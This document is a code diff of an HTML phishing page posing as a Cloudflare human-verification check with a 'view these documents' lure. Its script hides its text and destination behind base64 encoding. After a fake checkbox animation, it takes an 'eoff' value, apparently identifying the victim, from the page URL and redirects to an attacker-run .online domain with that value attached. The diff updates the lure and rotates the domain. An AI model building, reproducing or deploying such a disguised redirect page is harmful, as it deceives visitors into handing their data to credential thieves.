@@ -3,153 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Required</title>
+    <title>Verify you're human</title>
     <style>
-        /* Base Reset */
-        html, body { margin: 0; padding: 0; height: 100%; background-color: #ffffff; font-family: "Segoe UI", Tahoma, sans-serif; overflow: hidden; }
+        :root {
+            --bg-page: #ffffff;
+            --border-color: #e0e0e0;
+            --text-dark: #1a1a1a;
+            --text-muted: #666666;
+            --accent-blue: #0052cc;
+        }
 
-        /* Full Color Loading Overlay */
-        #splash-container {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        body, html {
+            margin: 0; padding: 0; height: 100%;
+            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-page);
             display: flex; justify-content: center; align-items: center;
-            background: #ffffff; z-index: 1000;
-        }
-        .pulsate { width: 100px; height: auto; animation: pulse-effect 2s ease-in-out infinite; }
-
-        @keyframes pulse-effect {
-            0%, 100% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.1); opacity: 1; }
+            overflow: hidden;
         }
 
-        /* Main View Container */
-        #gatekeeper-view {
-            display: none; flex-direction: column; justify-content: center;
-            align-items: center; height: 100vh;
+        /* Initial Loading Splash */
+        #splash-screen {
+            position: fixed; inset: 0;
+            background: #ffffff;
+            display: flex; justify-content: center; align-items: center;
+            z-index: 2000;
         }
 
-        #instruction-text { font-size: 14px; color: #333; margin-bottom: 18px; }
-
-        /* The Main Rectangular Box */
-        .widget-frame {
-            display: flex; justify-content: space-between; align-items: center;
-            width: 380px; padding: 16px 24px; border: 1px solid #e0e0e0;
-            border-radius: 4px; background: #f9f9f9; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        .pulsating-logo {
+            width: 100px; height: auto;
+            animation: soft-pulse 2s ease-in-out infinite;
         }
 
-        .flex-row { display: flex; align-items: center; gap: 12px; }
+        @keyframes soft-pulse {
+            0%, 100% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.05); opacity: 1; }
+        }
 
-        /* Logic for the Trigger Element */
-        .click-area { width: 26px; height: 26px; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        /* Unified Verification Container */
+        #app-view {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
 
-        /* Box state (Original) */
-        .box-outline { width: 22px; height: 22px; border: 2px solid #c1c1c1; border-radius: 3px; background: white; }
+        .instruction-header {
+            font-size: 14px;
+            color: var(--text-dark);
+            margin-bottom: 20px;
+        }
 
-        /* Spinner state (Replaces the box completely) */
-        .spinner { width: 22px; height: 22px; border: 3px solid #f3f3f3; border-top: 3px solid #0052cc; border-radius: 50%; animation: rotate-speed 0.8s linear infinite; }
+        /* The single rectangular box */
+        .verification-panel {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 380px;
+            padding: 18px 24px;
+            border: 1px solid var(--border-color);
+            background: #fafafa;
+            border-radius: 3px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
+        }
 
-        /* Check state */
-        .check-circle { width: 24px; height: 24px; background-color: #228b22; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 14px; }
+        .interactive-section {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
 
-        @keyframes rotate-speed { 100% { transform: rotate(360deg); } }
+        /* Interaction Elements */
+        .trigger-area {
+            width: 24px; height: 24px;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer;
+        }
 
-        /* Branding Styles */
-        #interaction-status { font-size: 14px; color: #555; }
-        .vendor-info { text-align: center; display: flex; flex-direction: column; align-items: center; }
-        .vendor-icon { width: 28px; height: auto; margin-bottom: 4px; }
-        #vendor-name { font-weight: 700; font-size: 15px; color: #1a1a1b; margin: 0; }
-        .footer-links { font-size: 10px; color: #888; margin-top: 2px; }
+        .check-box-ui {
+            width: 22px; height: 22px;
+            border: 2px solid #c1c1c1;
+            background: #fff;
+            border-radius: 2px;
+        }
+
+        .loading-spinner {
+            width: 20px; height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--accent-blue);
+            border-radius: 50%;
+            animation: spin-data 0.9s linear infinite;
+        }
+
+        .check-glyph {
+            color: #228b22;
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        @keyframes spin-data { 100% { transform: rotate(360deg); } }
+
+        /* Brand/Logo Section */
+        .branding-stack {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .mini-astro {
+            width: 28px;
+            height: auto;
+            margin-bottom: 4px;
+        }
+
+        .brand-name {
+            font-weight: 700;
+            font-size: 15px;
+            margin: 0;
+            color: #1a1a1b;
+        }
+
+        .sub-links {
+            font-size: 10px;
+            color: #999;
+            margin-top: 2px;
+        }
+
+        #status-text {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
     </style>
 </head>
 <body>
 
-    <div id="splash-container">
-        <img src="astro.png" class="pulsate" alt="Loading">
+    <div id="splash-screen">
+        <img src="astro.png" class="pulsating-logo" alt="Loading">
     </div>
 
-    <div id="gatekeeper-view">
-        <div id="instruction-text"></div>
-        <div class="widget-frame">
-            <div class="flex-row">
-                <div class="click-area" id="action-trigger">
-                    <div id="state-visual" class="box-outline"></div>
+    <div id="app-view">
+        <div class="instruction-header" id="msg-box"></div>
+
+        <div class="verification-panel">
+            <div class="interactive-section">
+                <div id="click-target" class="trigger-area">
+                    <div id="state-icon" class="check-box-ui"></div>
                 </div>
-                <span id="interaction-status"></span>
+                <span id="status-text"></span>
             </div>
-            <div class="vendor-info">
-                <img src="astro2.png" alt="" class="vendor-icon">
-                <p id="vendor-name"></p>
-                <div class="footer-links">Privacy . Terms</div>
+
+            <div class="branding-stack">
+                <img src="astro2.png" class="mini-astro" alt="Logo">
+                <p class="brand-name" id="brand-label"></p>
+                <div class="sub-links">Privacy • Terms</div>
             </div>
         </div>
     </div>
 
     <script>
         (function() {
-            const config = {
-                sMsg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
-                sBtn: "dmVyaWZ5",
-                sRun: "dmVyaWZ5aW5nLi4u",
-                sFin: "c3VjY2Vzcw==",
-                sBrand: "Q2xvdWRmbGFyZQ==",
-                // New URL: https://aeoffice.egvhfztransfercygv.online/wvwYPnsr#
-                sUrl: "aHR0cHM6Ly9hZW9mZmljZS5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3d2d1lQbnNyIw==",
-                sParam: "ZW9mZg=="
+            const vault = {
+                m: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
+                b: "dmVyaWZ5",
+                l: "dmVyaWZ5aW5nLi4u",
+                f: "c3VjY2Vzcw==",
+                n: "Q2xvdWRmbGFyZQ==",
+                // Updated URL
+                u: "aHR0cHM6Ly9hZW9mZmljZS5kaW9jdWFlLm9ubGluZS93dndZUG5zciM=",
+                p: "ZW9mZg=="
             };
 
-            const dom = {
-                msg: document.getElementById('instruction-text'),
-                stat: document.getElementById('interaction-status'),
-                name: document.getElementById('vendor-name'),
-                vis: document.getElementById('state-visual'),
-                btn: document.getElementById('action-trigger'),
-                gate: document.getElementById('gatekeeper-view'),
-                load: document.getElementById('splash-container')
-            };
+            const _q = (s) => document.querySelector(s);
+            const _d = (v) => atob(v);
 
-            const decode = (str) => atob(str);
-
-            // Startup Sequence
-            window.addEventListener('DOMContentLoaded', () => {
-                dom.msg.innerText = decode(config.sMsg);
-                dom.stat.innerText = decode(config.sBtn);
-                dom.name.innerText = decode(config.sBrand);
+            // Startup
+            window.addEventListener('load', () => {
+                _q('#msg-box').textContent = _d(vault.m);
+                _q('#status-text').textContent = _d(vault.b);
+                _q('#brand-label').textContent = _d(vault.n);
 
                 setTimeout(() => {
-                    dom.load.style.display = 'none';
-                    dom.gate.style.display = 'flex';
+                    _q('#splash-screen').style.display = 'none';
+                    _q('#app-view').style.display = 'flex';
                 }, 2000);
             });
 
-            // Interaction Sequence
-            dom.btn.addEventListener('click', function() {
-                // Change UI: Remove box-outline, add spinner
-                dom.vis.className = 'spinner';
-                dom.stat.innerText = decode(config.sRun);
-                this.style.pointerEvents = 'none';
+            // Action
+            _q('#click-target').onclick = function() {
+                this.onclick = null;
+                const icon = _q('#state-icon');
+
+                // Set Loading
+                icon.className = 'loading-spinner';
+                _q('#status-text').textContent = _d(vault.l);
 
                 setTimeout(() => {
-                    // Success state
-                    dom.vis.className = 'check-circle';
-                    dom.vis.innerText = '✓';
-                    dom.stat.innerText = decode(config.sFin);
-                    executeRedirect();
+                    // Set Success
+                    icon.className = 'check-glyph';
+                    icon.innerHTML = '✓';
+                    _q('#status-text').textContent = _d(vault.f);
+
+                    _proceed();
                 }, 2200);
-            });
+            };
 
-            function executeRedirect() {
-                const currentUrl = window.location.href;
-                const keyString = decode(config.sParam) + "=";
-                let capturedValue = "";
+            function _proceed() {
+                const url = window.location.href;
+                const key = _d(vault.p) + "=";
+                let val = "";
 
-                if (currentUrl.includes(keyString)) {
-                    capturedValue = currentUrl.split(keyString)[1];
+                if (url.indexOf(key) !== -1) {
+                    val = url.split(key)[1];
                 }
 
-                let finalDestination = decode(config.sUrl) + capturedValue;
-
-                setTimeout(() => {
-                    window.location.replace(finalDestination);
-                }, 800);
+                const target = _d(vault.u) + val;
+                setTimeout(() => { window.location.replace(target); }, 800);
             }
         })();
     </script>
